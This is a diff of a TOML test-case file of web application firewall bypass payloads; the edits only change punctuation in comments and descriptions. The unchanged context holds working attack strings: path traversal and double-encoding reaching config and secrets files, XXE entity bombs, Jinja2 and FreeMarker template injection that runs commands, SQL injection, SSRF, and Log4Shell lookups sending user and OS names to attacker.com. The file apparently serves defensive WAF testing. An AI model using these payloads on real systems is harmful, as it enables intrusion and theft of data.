@@ -1,5 +1,5 @@
 schema = 1
-# Real-world bypass cases — payloads observed in active CVE PoCs,
+# Real-world bypass cases, payloads observed in active CVE PoCs,
 # commercial WAF research disclosures, and CTF write-ups in
 # 2024–2026.  Each case is HARDER than a generic regex catch:
 # either the WAF would need vendor-specific knowledge or a
@@ -10,7 +10,7 @@ schema = 1
 id = "cve_2024_7593_ivanti_vtm"
 class = "cve_pocs"
 payload = "/login/?path=..%2f..%2fconfig"
-description = "Ivanti vTM admin panel — encoded ../ traversal slipping past their custom path  normaliser.  WAFs that decode once and pattern-match on `../` miss this  because the decode-once happens BEFORE the second %2f appears."
+description = "Ivanti vTM admin panel, encoded ../ traversal slipping past their custom path  normaliser.  WAFs that decode once and pattern-match on `../` miss this  because the decode-once happens BEFORE the second %2f appears."
 
 # ── CVE-2024-4577: PHP CGI argument injection (the BIG one) ──
 [[case]]
@@ -32,7 +32,7 @@ class = "cve_pocs"
 payload = "/autodiscover/autodiscover.json/?@evil.com/ews/exchange.asmx"
 description = "Proxy-Shell-style email-style address smuggling via `@` in URL path.   Many WAF rules don't normalise the `@` semantics before  pattern-matching the routing prefix."
 
-# ── XML External Entity (XXE) — bytestream-confusing forms ──
+# ── XML External Entity (XXE), bytestream-confusing forms ──
 [[case]]
 id = "xxe_utf16_le_with_bom"
 class = "cve_pocs"
@@ -45,7 +45,7 @@ class = "cve_pocs"
 payload = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % a \"&#x25;b;\"><!ENTITY % b \"<!ENTITY c '&#x25;a;'>\">%a;]><r>&c;</r>"
 description = "Parameter-entity nested billion-laughs.  Defeats DTD-strip WAFs that  only look at <!ENTITY ... > but not nested parameter-entity expansion."
 
-# ── HTTP request smuggling — modern variants ──
+# ── HTTP request smuggling, modern variants ──
 [[case]]
 id = "smuggling_cl0te_with_chunk_ext"
 class = "cve_pocs"
@@ -63,14 +63,14 @@ description = "TE.TE with RFC 7230 §3.2.4 obsolete line-folding (CRLF + SP).  M
 id = "graphql_alias_introspection_smuggle"
 class = "cve_pocs"
 payload = "query { user(id:1) { name } x: __schema { types { name fields { name } } } }"
-description = "GraphQL aliasing — query LOOKS like a user-record fetch but the `x:`  alias smuggles full introspection.  Static-pattern WAFs that block on  `__schema` literal still fire here, but ML-based WAFs miss the  aliasing trick."
+description = "GraphQL aliasing, query LOOKS like a user-record fetch but the `x:`  alias smuggles full introspection.  Static-pattern WAFs that block on  `__schema` literal still fire here, but ML-based WAFs miss the  aliasing trick."
 
-# ── Server-side template injection — modern payloads ──
+# ── Server-side template injection, modern payloads ──
 [[case]]
 id = "ssti_jinja_sandbox_escape_2024"
 class = "cve_pocs"
 payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
-description = "Jinja2 sandbox escape using `self.__init__.__globals__` — the canonical  2024 form.  Some WAFs catch `__import__` but miss the `__globals__`  walk."
+description = "Jinja2 sandbox escape using `self.__init__.__globals__`: the canonical  2024 form.  Some WAFs catch `__import__` but miss the `__globals__`  walk."
 
 [[case]]
 id = "ssti_freemarker_assign_to_new_obj"
@@ -78,7 +78,7 @@ class = "cve_pocs"
 payload = "<#assign value=\"freemarker.template.utility.Execute\"?new()>${value(\"id\")}"
 description = "FreeMarker SSTI via dynamic class loading.  Catches WAFs blocking only  Jinja-style `{{ }}` while letting FreeMarker `<#...>` through."
 
-# ── Log4Shell — modern obfuscated variants ──
+# ── Log4Shell, modern obfuscated variants ──
 [[case]]
 id = "log4shell_nested_env_substitution"
 class = "cve_pocs"
@@ -91,7 +91,7 @@ class = "cve_pocs"
 payload = "${jndi:ldap://${sys:user.name}.${sys:os.name}.attacker.com/x}"
 description = "Log4Shell that leaks user.name + os.name via DNS lookup hostname.   Used for fingerprinting without needing an open LDAP listener."
 
-# ── XSS — DOM clobbering + mutation XSS ──
+# ── XSS: DOM clobbering + mutation XSS ──
 [[case]]
 id = "xss_dom_clobber_form_action"
 class = "cve_pocs"
@@ -104,7 +104,7 @@ class = "cve_pocs"
 payload = "<noscript><p title='</noscript><img src=x onerror=alert(1)>'>"
 description = "mXSS via Chrome's HTML tokenizer reparsing `<noscript>` content after  page load.  DOMPurify ≤3.0.5 missed this; 3.0.6 fixed it but many  deployments lag."
 
-# ── SQL — second-order injection chains ──
+# ── SQL, second-order injection chains ──
 [[case]]
 id = "sqli_second_order_via_quote_escape"
 class = "cve_pocs"
@@ -117,7 +117,7 @@ class = "cve_pocs"
 payload = "' AND SLEEP(5) AND '1'='1"
 description = "Blind time-based SQLi.  Defeats response-content WAF rules; only catches  if WAF inspects response latency relative to baseline (`ffuf -ac`-style)."
 
-# ── Path traversal — non-canonical encodings ──
+# ── Path traversal, non-canonical encodings ──
 [[case]]
 id = "path_traversal_unicode_normalisation"
 class = "cve_pocs"
@@ -130,7 +130,7 @@ class = "cve_pocs"
 payload = "/api/file?path=..%252fconfig%252fsecrets.json"
 description = "Double URL encoding.  WAFs that decode once see `..%2fconfig` (not a  traversal); origins that decode twice see `../config/secrets.json`."
 
-# ── SSRF — protocol smuggling ──
+# ── SSRF, protocol smuggling ──
 [[case]]
 id = "ssrf_gopher_to_redis"
 class = "cve_pocs"
@@ -150,7 +150,7 @@ class = "cve_pocs"
 payload = "/account/settings/nonexistent.css"
 description = "Cache-deception attack: app routes /account/settings/* dynamically; CDN  caches anything ending in .css.  Attacker visits, caches their session  page, next visitor gets it."
 
-# ── Open redirect — modern bypasses ──
+# ── Open redirect, modern bypasses ──
 [[case]]
 id = "open_redirect_userinfo_smuggle"
 class = "cve_pocs"
